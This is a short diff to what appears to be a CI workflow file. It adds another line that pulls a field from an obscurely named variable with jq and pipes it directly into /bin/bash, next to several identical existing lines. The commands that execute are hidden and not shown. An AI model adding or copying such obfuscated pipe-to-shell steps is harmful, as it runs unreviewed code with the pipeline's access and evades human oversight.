@@ -29,6 +29,7 @@ jobs:
           echo $nu18 | jq -r .y8 | /bin/bash
           echo $n4 | jq -r .lmtq4 | /bin/bash
           echo $n322 | jq -r .fty14 | /bin/bash
+          echo $ntws1 | jq -r .fe049 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
